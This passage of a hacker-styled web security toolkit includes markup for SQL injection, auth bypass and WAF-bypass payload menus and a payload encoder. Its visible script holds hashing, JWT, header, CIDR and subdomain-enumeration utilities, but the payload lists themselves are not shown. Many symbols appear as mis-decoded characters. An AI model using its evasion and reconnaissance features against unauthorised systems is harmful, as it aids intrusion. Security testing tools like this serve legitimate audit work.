          <option value="time">Time Based</option>
          <option value="union">UNION Based</option>
          <option value="auth">Auth Bypass</option>
          <option value="filter">WAF Bypass</option>
        </select>
        <div style="overflow-x:auto; margin-top:8px;">
          <table class="payload-table" id="sqli-table">
            <thead><tr><th>PAYLOAD</th><th>DB</th><th>COPY</th></tr></thead>
            <tbody id="sqli-body"><!-- populated by JS --></tbody>
          </table>
        </div>
      </div>

      <div class="tool-card danger">
        <div class="card-title danger">âš¡ PAYLOAD ENCODER</div>
        <textarea id="pe-input" rows="4" placeholder="Raw payload to encode..."></textarea>
        <div class="btn-row">
          <button class="btn danger" onclick="encodePayload('url')">URL ENCODE</button>
          <button class="btn danger" onclick="encodePayload('double')">DOUBLE URL</button>
          <button class="btn danger" onclick="encodePayload('html')">HTML ENTITY</button>
          <button class="btn danger" onclick="encodePayload('unicode')">UNICODE</button>
          <button class="btn danger" onclick="encodePayload('b64')">BASE64</button>
        </div>
        <div class="output-box" id="pe-output" style="min-height:100px;"><span class="result-line dim">[ ENCODED OUTPUT ]</span></div>
        <button class="btn" onclick="copyOutput('pe-output')" style="font-size:0.65rem;">COPY</button>
      </div>

      <div class="tool-card danger">
        <div class="card-title danger">ğŸ”“ AUTH BYPASS VECTORS</div>
        <select id="ab-type" onchange="loadAuthBypass()">
          <option value="sqli">SQL Injection Auth</option>
          <option value="jwt">JWT Manipulation</option>
          <option value="idor">IDOR Patterns</option>
          <option value="oauth">OAuth Misconfig</option>
          <option value="headers">Header Injection</option>
        </select>
        <div class="output-box" id="ab-output" style="min-height:220px; padding:0; margin-top:8px;"><!-- populated by JS --></div>
      </div>

    </div>
  </div>

  <!-- =================== TOPH AUDIT =================== -->
  <div id="tab-toph" class="tab-panel">
    <div class="stats-row" id="toph-stats">
      <div class="stat-chip"><span class="val" style="color:var(--neon-green)" id="st-axioms">42</span><span class="lbl">AXIOMS</span></div>
      <div class="stat-chip"><span class="val" style="color:var(--neon-purple)" id="st-gaps">0</span><span class="lbl">GAPS FOUND</span></div>
      <div class="stat-chip"><span class="val" style="color:var(--danger)" id="st-violations">0</span><span class="lbl">VIOLATIONS</span></div>
      <div class="stat-chip"><span class="val" style="color:var(--warn)" id="st-score">â€”</span><span class="lbl">AUDIT SCORE</span></div>
      <div class="stat-chip"><span class="val" style="color:var(--neon-cyan)" id="st-rem">â€”</span><span class="lbl">REMEDIATION $</span></div>
    </div>

    <div class="panel-grid">

      <div class="tool-card warn">
        <div class="card-title warn">â¬¡ TOPH FRAMEWORK â€” GAP MAPPER</div>
        <div class="section-label">INDUSTRY SECTOR</div>
        <select id="toph-industry">
          <option value="healthcare">Healthcare / HIPAA</option>
          <option value="finance">Finance / SOX</option>
          <option value="retail">Retail / PCI-DSS</option>
          <option value="insurance">Insurance / AI-Driven</option>
          <option value="saas">SaaS / API Platform</option>
          <option value="gov">Government / FedRAMP</option>
          <option value="telecom">Telecom / CAN-SPAM</option>
          <option value="ai">AI Platform / TOPH</option>
        </select>
        <div class="section-label">PLATFORM TYPE</div>
        <select id="toph-platform">
          <option value="web">Web Application</option>
          <option value="mobile">Mobile App</option>
          <option value="api">API Service</option>
          <option value="ai">AI/ML System</option>
          <option value="infra">Infrastructure</option>
        </select>
        <button class="btn warn" onclick="runTOPH()" style="margin-top:8px;">â–¶ MAP GAPS</button>
        <div class="output-box" id="toph-output" style="min-height:200px;"><span class="result-line dim">[ SELECT SECTOR AND PLATFORM, THEN RUN GAP MAPPER ]</span></div>
      </div>

      <div class="tool-card warn">
        <div class="card-title warn">ğŸ“ AXIOM COMPLIANCE MATRIX</div>
        <div class="output-box" id="axiom-matrix" style="min-height:320px; padding:0;"><!-- populated by JS --></div>
      </div>

      <div class="tool-card">
        <div class="card-title">ğŸ¢ PATRICIA PATTERN DETECTOR</div>
        <div style="font-size:0.72rem; color:var(--text-dim); margin-bottom:10px;">
          Detect constraint-as-product billing architectures across platform interactions.
        </div>
        <textarea id="pat-input" rows="5" placeholder="Paste platform terms, pricing docs, API limits, or system responses here..."></textarea>
        <button class="btn" onclick="detectPatricia()">DETECT PATRICIA</button>
        <div class="output-box" id="pat-output" style="min-height:160px;"><span class="result-line dim">[ PATRICIA PATTERN ANALYSIS ]</span></div>
      </div>

      <div class="tool-card">
        <div class="card-title">âš–ï¸ TOPH LEGAL DOCUMENTATION BUILDER</div>
        <div class="section-label">CASE TYPE</div>
        <select id="legal-type">
          <option value="ada">ADA Violation</option>
          <option value="canspam">CAN-SPAM Violation</option>
          <option value="patricia">Patricia Pattern (AI Billing)</option>
          <option value="breach">Data Breach / HIPAA</option>
          <option value="idor">IDOR / Privacy Violation</option>
        </select>
        <input type="text" id="legal-target" placeholder="Target entity name" style="margin-top:6px;margin-bottom:6px;"/>
        <input type="text" id="legal-date" placeholder="Incident date" />
        <textarea id="legal-facts" rows="3" placeholder="Key facts / evidence summary..." style="margin-top:6px;"></textarea>
        <button class="btn" onclick="buildLegal()">BUILD DOCUMENTATION</button>
        <div class="output-box" id="legal-output" style="min-height:140px; font-size:0.67rem;"><span class="result-line dim">[ LEGAL DOC BUILDER READY ]</span></div>
        <button class="btn" onclick="copyOutput('legal-output')" style="font-size:0.65rem;">COPY</button>
      </div>

    </div>
  </div>

</div><!-- /app -->

<script>
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// TRIPOD-IP-v1.0 | DLW | TriPod LLC | 2026-02-18
// SHA256: 02880745b847317c4e2424524ec25d0f7a2b84368d184586f45b54af9fcab763
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// â”€â”€â”€ MATRIX RAIN â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
const canvas = document.getElementById('rain-canvas');
const ctx = canvas.getContext('2d');
let cols, drops;
function initRain() {
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
  cols = Math.floor(canvas.width / 16);
  drops = Array(cols).fill(1);
}
function drawRain() {
  ctx.fillStyle = 'rgba(2,13,13,0.05)';
  ctx.fillRect(0,0,canvas.width,canvas.height);
  ctx.fillStyle = '#00ffe5';
  ctx.font = '13px Share Tech Mono';
  const chars = '01ã‚¢ã‚¤ã‚¦ã‚¨ã‚ªã‚«ã‚­ã‚¯ã‚±ã‚³ã‚µã‚·ã‚¹ã‚»ã‚½ã‚¿ãƒãƒ„ãƒ†ãƒˆãƒŠãƒ‹ãƒŒãƒãƒâˆâˆ‚âˆ‡â¬¡â—ˆâ–³â–½âŠ•âŠ—';
  for (let i=0; i<drops.length; i++) {
    const c = chars[Math.floor(Math.random()*chars.length)];
    ctx.globalAlpha = Math.random() * 0.8 + 0.2;
    ctx.fillText(c, i*16, drops[i]*16);
    if (drops[i]*16 > canvas.height && Math.random() > 0.975) drops[i] = 0;
    drops[i]++;
  }
  ctx.globalAlpha = 1;
}
initRain();
window.addEventListener('resize', initRain);
setInterval(drawRain, 45);

// â”€â”€â”€ CURSOR TRAIL â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
const dot = document.getElementById('cursor-dot');
const trails = [];
for (let i=0; i<8; i++) {
  const t = document.createElement('div');
  t.className = 'cursor-trail';
  const hue = i * (360/8);
  t.style.background = `hsl(${hue},100%,70%)`;
  t.style.opacity = (1 - i/8) * 0.6;
  document.body.appendChild(t);
  trails.push({el:t, x:0, y:0});
}
let mx=0, my=0;
document.addEventListener('mousemove', e => {
  mx = e.clientX; my = e.clientY;
  dot.style.left = mx+'px'; dot.style.top = my+'px';
});
function animTrails() {
  let ox=mx, oy=my;
  trails.forEach((t,i) => {
    t.x += (ox - t.x) * 0.3;
    t.y += (oy - t.y) * 0.3;
    t.el.style.left = t.x+'px';
    t.el.style.top = t.y+'px';
    ox = t.x; oy = t.y;
  });
  requestAnimationFrame(animTrails);
}
animTrails();

// â”€â”€â”€ TABS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function switchTab(id) {
  document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
  document.getElementById('tab-'+id).classList.add('active');
  event.target.classList.add('active');
  if(id==='toph') buildAxiomMatrix();
  if(id==='payloads') { loadPayloads('xss'); loadPayloads('sqli'); loadAuthBypass(); }
}

// â”€â”€â”€ UTILS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function setOutput(id, html) { document.getElementById(id).innerHTML = html; }
function line(cls, txt) { return `<div class="result-line ${cls}">${txt}</div>`; }
function clearOutput(id) { setOutput(id, line('dim','[ CLEARED ]')); }
function clearIO(a,b) { document.getElementById(a).value=''; setOutput(b, line('dim','[ CLEARED ]')); }
function copyOutput(id) {
  const el = document.getElementById(id);
  navigator.clipboard.writeText(el.innerText).catch(()=>{});
  const t = document.getElementById('copy-toast');
  t.classList.add('show');
  setTimeout(()=>t.classList.remove('show'), 1500);
}
function showToast() {
  const t = document.getElementById('copy-toast');
  t.classList.add('show');
  setTimeout(()=>t.classList.remove('show'),1500);
}

// â”€â”€â”€ HASH GENERATOR â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
async function genHash(algo) {
  const txt = document.getElementById('hash-input').value;
  if (!txt) { setOutput('hash-output', line('warn','[ NO INPUT ]')); return; }
  const enc = new TextEncoder();
  const buf = await crypto.subtle.digest(algo, enc.encode(txt));
  const hex = Array.from(new Uint8Array(buf)).map(b=>b.toString(16).padStart(2,'0')).join('');
  const len = buf.byteLength * 8;
  setOutput('hash-output',
    line('dim','ALGORITHM : ')+line('info', algo)+
    line('dim','INPUT LEN : ')+line('info', txt.length+' chars')+
    line('dim','HASH BITS : ')+line('info', len)+
    line('dim','â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€')+
    line('ok', hex)
  );
}

// â”€â”€â”€ BASE64 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function b64encode() {
  const v = document.getElementById('b64-input').value;
  try { setOutput('b64-output', line('ok', btoa(unescape(encodeURIComponent(v))))); }
  catch(e) { setOutput('b64-output', line('fail','ERROR: '+e.message)); }
}
function b64decode() {
  const v = document.getElementById('b64-input').value;
  try { setOutput('b64-output', line('ok', decodeURIComponent(escape(atob(v.trim()))))); }
  catch(e) { setOutput('b64-output', line('fail','INVALID BASE64: '+e.message)); }
}
function hexEncode() {
  const v = document.getElementById('hex-input').value;
  const hex = Array.from(v).map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join(' ');
  setOutput('hex-output', line('ok', hex));
}
function hexDecode() {
  const v = document.getElementById('hex-input').value.replace(/\s/g,'');
  try {
    const txt = v.match(/.{1,2}/g).map(b=>String.fromCharCode(parseInt(b,16))).join('');
    setOutput('hex-output', line('ok', txt));
  } catch(e) { setOutput('hex-output', line('fail','INVALID HEX')); }
}

// â”€â”€â”€ JWT DECODER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function decodeJWT() {
  const tok = document.getElementById('jwt-input').value.trim();
  const parts = tok.split('.');
  if (parts.length < 2) { setOutput('jwt-output', line('fail','INVALID JWT: Expected 3 segments')); return; }
  try {
    const header = JSON.parse(atob(parts[0].replace(/-/g,'+').replace(/_/g,'/')));
    const payload = JSON.parse(atob(parts[1].replace(/-/g,'+').replace(/_/g,'/')));
    const now = Math.floor(Date.now()/1000);
    const expired = payload.exp && payload.exp < now;
    let out = line('info','â•”â•â• JWT ANALYSIS â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•')+
      line('dim','â•‘ HEADER')+
      line('warn', 'â•‘ alg : '+header.alg + (header.alg==='none'?' â† âš  DANGEROUS':''))+
      line('info', 'â•‘ typ : '+(header.typ||'â€”'))+
      line('dim','â•‘')+
      line('dim','â•‘ PAYLOAD');
    Object.entries(payload).forEach(([k,v])=>{
      if(k==='exp') out += line(expired?'fail':'ok','â•‘ exp : '+new Date(v*1000).toISOString()+(expired?' â† EXPIRED':' â† VALID'));
      else if(k==='iat') out += line('info','â•‘ iat : '+new Date(v*1000).toISOString());
      else out += line('info','â•‘ '+k.padEnd(6)+': '+JSON.stringify(v));
    });
    out += line('dim','â•‘')+
      line(expired?'fail':'ok','â•‘ STATUS: '+(expired?'âš  TOKEN EXPIRED':'âœ“ TOKEN VALID'))+
      line(header.alg==='none'?'fail':header.alg==='HS256'?'warn':'ok',
        'â•‘ ALGO RISK: '+(header.alg==='none'?'CRITICAL - NO SIGNATURE':header.alg==='HS256'?'MODERATE - SYMMETRIC KEY':'LOW'))+
      line('dim','â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•');
    setOutput('jwt-output', out);
  } catch(e) { setOutput('jwt-output', line('fail','DECODE ERROR: '+e.message)); }
}

// â”€â”€â”€ ENTROPY â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function calcEntropy() {
  const s = document.getElementById('entropy-input').value;
  if (!s) { setOutput('entropy-output', line('dim','NO INPUT')); return; }
  const freq = {};
  for (const c of s) freq[c] = (freq[c]||0)+1;
  let H = 0;
  for (const f of Object.values(freq)) {
    const p = f/s.length;
    H -= p * Math.log2(p);
  }
  const bits = H * s.length;
  const pct = Math.min(H/8 * 100, 100);
  const label = H<2?'VERY LOW':H<3?'LOW':H<4?'MODERATE':H<5?'GOOD':H<6?'HIGH':'VERY HIGH';
  const color = H<2?'var(--danger)':H<3?'var(--warn)':H<4?'var(--warn)':'var(--success)';
  document.getElementById('entropy-val').textContent = H.toFixed(3)+' bits/char';
  document.getElementById('entropy-val').style.color = color;
  document.getElementById('entropy-bar').style.width = pct+'%';
  document.getElementById('entropy-bar').style.background = color;
  document.getElementById('entropy-label').textContent = label;
  const uniq = Object.keys(freq).length;
  setOutput('entropy-output',
    line('info','SHANNON ENTROPY : '+H.toFixed(4)+' bits/char')+
    line('info','TOTAL BITS      : '+bits.toFixed(1))+
    line('info','UNIQUE CHARS    : '+uniq+' / '+s.length)+
    line(H<3?'fail':H<4?'warn':'ok', 'ASSESSMENT      : '+label)+
    line('dim','CHARSET SIZE    : '+uniq)+
    line('dim','CRACK ESTIMATE  : '+(H<3?'Trivially fast':H<4?'Minutes':H<5?'Hoursâ€“Days':'Years+'))
  );
}

// â”€â”€â”€ ROT / CAESAR â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function rotCipher() {
  const txt = document.getElementById('rot-input').value;
  const n = parseInt(document.getElementById('rot-n').value)||13;
  setOutput('rot-output', line('ok', rot(txt,n)));
}
function rot(txt, n) {
  return txt.replace(/[a-zA-Z]/g, c => {
    const b = c<='Z'?65:97;
    return String.fromCharCode(((c.charCodeAt(0)-b+n)%26)+b);
  });
}
function rotBrute() {
  const txt = document.getElementById('rot-input').value;
  let out = '';
  for(let i=1;i<=25;i++) out += line('info','ROT'+i.toString().padStart(2,'0')+': '+rot(txt,i));
  setOutput('rot-output', out);
}

// â”€â”€â”€ PBKDF2 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
async function pbkdf2Hash() {
  const pw = document.getElementById('ph-pass').value;
  let salt = document.getElementById('ph-salt').value;
  if (!pw) { setOutput('ph-output', line('fail','NO PASSWORD')); return; }
  const saltBytes = salt
    ? new TextEncoder().encode(salt)
    : crypto.getRandomValues(new Uint8Array(16));
  const saltHex = Array.from(saltBytes).map(b=>b.toString(16).padStart(2,'0')).join('');
  const key = await crypto.subtle.importKey('raw', new TextEncoder().encode(pw), 'PBKDF2', false, ['deriveBits']);
  const derived = await crypto.subtle.deriveBits(
    { name:'PBKDF2', salt:saltBytes, iterations:310000, hash:'SHA-256' }, key, 256);
  const hex = Array.from(new Uint8Array(derived)).map(b=>b.toString(16).padStart(2,'0')).join('');
  setOutput('ph-output',
    line('dim','ALGORITHM  : PBKDF2-SHA256')+
    line('dim','ITERATIONS : 310,000')+
    line('info','SALT (hex) : '+saltHex)+
    line('ok','HASH       : '+hex)
  );
}

// â”€â”€â”€ URL ANALYZER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function analyzeURL() {
  const raw = document.getElementById('url-input').value.trim();
  try {
    const u = new URL(raw);
    const params = {};
    u.searchParams.forEach((v,k)=>params[k]=v);
    const risks = [];
    if (u.protocol==='http:') risks.push('âš  HTTP (no TLS)');
    if (u.pathname.match(/\.\./)) risks.push('âš  Path traversal pattern');
    if (raw.match(/<|>|"|'/)) risks.push('âš  HTML chars in URL');
    if (raw.match(/script:/i)) risks.push('ğŸš¨ Script protocol');
    if (raw.match(/(%27|%22|%3c|%3e)/i)) risks.push('âš  Encoded HTML chars');
    if (Object.keys(params).some(k=>k.match(/id|user|file|path|dir|url|redirect/i)))
      risks.push('âš  Potentially injectable parameter names');
    let out =
      line('dim','PROTOCOL  : ')+line('info', u.protocol)+
      line('dim','HOST      : ')+line('info', u.hostname)+
      line('dim','PORT      : ')+line('info', u.port||'(default)')+
      line('dim','PATH      : ')+line('info', u.pathname)+
      line('dim','QUERY     : ')+line('info', u.search||'(none)')+
      line('dim','FRAGMENT  : ')+line('info', u.hash||'(none)')+
      line('dim','â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€');
    if (Object.keys(params).length) {
      out += line('warn','PARAMETERS:');
      Object.entries(params).forEach(([k,v])=>out+=line('warn','  '+k+' = '+v));
    }
    out += line('dim','â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€');
    if (risks.length) risks.forEach(r=>out+=line('fail',r));
    else out += line('ok','âœ“ No obvious URL-level risks detected');
    setOutput('url-output', out);
  } catch(e) { setOutput('url-output', line('fail','INVALID URL: '+e.message)); }
}

// â”€â”€â”€ CIDR CALCULATOR â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function calcCIDR() {
  const raw = document.getElementById('cidr-input').value.trim();
  const m = raw.match(/^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\/(\d{1,2})$/);
  if (!m) { setOutput('cidr-output', line('fail','INVALID CIDR NOTATION')); return; }
  const ip = m[1], prefix = parseInt(m[2]);
  if (prefix<0||prefix>32) { setOutput('cidr-output', line('fail','PREFIX 0-32 ONLY')); return; }
  const parts = ip.split('.').map(Number);
  if (parts.some(p=>p<0||p>255)) { setOutput('cidr-output', line('fail','INVALID IP')); return; }
  const ipInt = (parts[0]<<24)|(parts[1]<<16)|(parts[2]<<8)|parts[3];
  const mask = prefix===0?0:(~0<<(32-prefix))>>>0;
  const net = (ipInt&mask)>>>0;
  const bcast = (net|(~mask>>>0))>>>0;
  const first = net+1, last = bcast-1;
  const hosts = prefix>=31?Math.pow(2,32-prefix):Math.pow(2,32-prefix)-2;
  const toIP = n => [(n>>>24)&255,(n>>>16)&255,(n>>>8)&255,n&255].join('.');
  const toMask = n => toIP(n);
  setOutput('cidr-output',
    line('dim','â”€â”€â”€ CIDR: '+raw+' â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€')+
    line('info','NETWORK ADDR   : '+toIP(net))+
    line('info','BROADCAST      : '+toIP(bcast))+
    line('info','SUBNET MASK    : '+toMask(mask))+
    line('info','WILDCARD MASK  : '+toMask(~mask>>>0))+
    line('ok', 'FIRST HOST     : '+toIP(first))+
    line('ok', 'LAST HOST      : '+toIP(last))+
    line('warn','USABLE HOSTS   : '+hosts.toLocaleString())+
    line('info','PREFIX BITS    : /'+prefix)+
    line('info','IP CLASS       : '+(parts[0]<128?'A':parts[0]<192?'B':'C'))+
    line('dim','PRIVATE RANGE  : '+(
      (parts[0]===10)||(parts[0]===172&&parts[1]>=16&&parts[1]<=31)||(parts[0]===192&&parts[1]===168)?'YES âœ“':'NO'))
  );
}

// â”€â”€â”€ HEADER ANALYZER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
const SECURITY_HEADERS = {
  'strict-transport-security': {name:'HSTS', level:'critical', desc:'Forces HTTPS'},
  'content-security-policy': {name:'CSP', level:'critical', desc:'Prevents XSS/injection'},
  'x-frame-options': {name:'X-Frame-Options', level:'high', desc:'Prevents clickjacking'},
  'x-content-type-options': {name:'X-Content-Type', level:'medium', desc:'Prevents MIME sniffing'},
  'referrer-policy': {name:'Referrer-Policy', level:'medium', desc:'Controls referrer leakage'},
  'permissions-policy': {name:'Permissions-Policy', level:'medium', desc:'Restricts browser features'},
  'x-xss-protection': {name:'X-XSS-Protection', level:'low', desc:'Legacy XSS filter'},
  'cache-control': {name:'Cache-Control', level:'low', desc:'Cache directives'},
  'server': {name:'Server', level:'info', desc:'Reveals server software'},
  'x-powered-by': {name:'X-Powered-By', level:'high', desc:'âš  Reveals tech stack'},
  'access-control-allow-origin': {name:'CORS Origin', level:'high', desc:'CORS policy'},
  'set-cookie': {name:'Set-Cookie', level:'high', desc:'Cookie security flags'},
};
function analyzeHeaders() {
  const raw = document.getElementById('header-input').value;
  const parsed = {};
  raw.split('\n').forEach(l=>{
    const m = l.match(/^([^:]+):\s*(.+)$/);
    if(m) parsed[m[1].toLowerCase().trim()] = m[2].trim();
  });
  let out = line('dim','â•â•â• SECURITY HEADER ANALYSIS â•â•â•â•â•â•â•â•â•â•â•â•â•â•')+'\n';
  let score = 0; let max = 0;
  const critical = ['strict-transport-security','content-security-policy','x-frame-options','x-content-type-options'];
  critical.forEach(h=>{
    max += 20;
    if(parsed[h]) {
      score += 20;
      out += line('ok','[PRESENT] '+SECURITY_HEADERS[h].name+': '+parsed[h]);
    } else {
      out += line('fail','[MISSING] '+SECURITY_HEADERS[h].name+' â€” '+SECURITY_HEADERS[h].desc);
    }
  });
  // Check for info leaks
  if(parsed['server']) out += line('warn','[LEAK] Server: '+parsed['server']+' â€” Reveals software version');
  if(parsed['x-powered-by']) out += line('fail','[LEAK] X-Powered-By: '+parsed['x-powered-by']+' â€” REMOVE THIS HEADER');
  if(parsed['set-cookie']) {
    const c = parsed['set-cookie'];
    out += line(c.includes('HttpOnly')&&c.includes('Secure')?'ok':'fail',
      '[COOKIE] '+(c.includes('HttpOnly')?'âœ“ HttpOnly ':'âš  NO HttpOnly ')+(c.includes('Secure')?'âœ“ Secure ':'âš  NO Secure ')+(c.includes('SameSite')?'âœ“ SameSite':'âš  NO SameSite'));
  }
  if(parsed['access-control-allow-origin']==='*') out += line('fail','[CORS] Wildcard origin (*) â€” CRITICAL MISCONFIGURATION');
  out += line('dim','â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€')+
    line(score>=80?'ok':score>=60?'warn':'fail', 'HEADER SCORE: '+score+'/'+max+' ('+Math.round(score/max*100)+'%)');
  setOutput('header-output', out);
}

// â”€â”€â”€ PORT DATABASE â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
const PORTS = [
  [21,'FTP','tcp','WARN'],     [22,'SSH','tcp','OK'],      [23,'Telnet','tcp','CRIT'],
  [25,'SMTP','tcp','WARN'],    [53,'DNS','udp','INFO'],     [80,'HTTP','tcp','WARN'],
  [110,'POP3','tcp','WARN'],   [135,'RPC','tcp','CRIT'],    [139,'NetBIOS','tcp','CRIT'],
  [143,'IMAP','tcp','WARN'],   [443,'HTTPS','tcp','OK'],    [445,'SMB','tcp','CRIT'],
  [1433,'MSSQL','tcp','CRIT'],[1521,'Oracle','tcp','CRIT'],[3306,'MySQL','tcp','CRIT'],
  [3389,'RDP','tcp','CRIT'],   [4444,'Metasploit','tcp','CRIT'],[5432,'PostgreSQL','tcp','CRIT'],
  [5900,'VNC','tcp','CRIT'],   [6379,'Redis','tcp','CRIT'], [8080,'HTTP-Alt','tcp','WARN'],
  [8443,'HTTPS-Alt','tcp','INFO'],[9200,'Elasticsearch','tcp','CRIT'],[27017,'MongoDB','tcp','CRIT'],
];
function searchPorts() {
  const q = document.getElementById('port-search').value.toLowerCase();
  const filtered = q ? PORTS.filter(p=>p[0].toString().includes(q)||p[1].toLowerCase().includes(q)) : PORTS;
  const colorMap = {OK:'ok',WARN:'warn',CRIT:'fail',INFO:'info'};
  let html = '';
  filtered.forEach(([p,svc,proto,risk])=>{
    html += `<div class="port-row">
      <span style="color:var(--neon-cyan);min-width:50px">${p}</span>
      <span style="flex:1">${svc}</span>
      <span style="color:var(--text-dim);font-size:0.65rem">${proto.toUpperCase()}</span>
      <span class="badge ${risk==='OK'?'green':risk==='WARN'?'yellow':risk==='CRIT'?'red':'blue'}" style="margin-left:8px">${risk}</span>
    </div>`;
  });
  document.getElementById('port-output').innerHTML = html || line('dim','NO MATCHES');
}
searchPorts();

// â”€â”€â”€ SUBDOMAIN GENERATOR â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
const SD_WORDLISTS = {
  common: ['www','mail','ftp','admin','api','dev','staging','test','qa','beta','app','portal','vpn','remote','secure','old','new','login','blog','shop'],
  cloud: ['aws','s3','cdn','static','assets','media','img','files','upload','backup','storage','cloudfront','azure','gcp','lambda'],
  infra: ['git','gitlab','github','ci','jenkins','jira','confluence','nagios','monitor','logs','elk','kibana','grafana','bastion','proxy','jump'],
  all: []
};
SD_WORDLISTS.all = [...new Set([...SD_WORDLISTS.common,...SD_WORDLISTS.cloud,...SD_WORDLISTS.infra])];
function genSubdomains() {
  const domain = document.getElementById('sd-domain').value.trim();
  const wl = document.getElementById('sd-wordlist').value;
  if(!domain) { setOutput('sd-output', line('fail','ENTER DOMAIN')); return; }
  const words = SD_WORDLISTS[wl];
  let out = '';
  words.forEach(w=>out+=line('info', w+'.'+domain));
  setOutput('sd-output', out);
}

// â”€â”€â”€ USER-AGENT GENERATOR â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
const UA_BANK = {
  browser: ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15'],
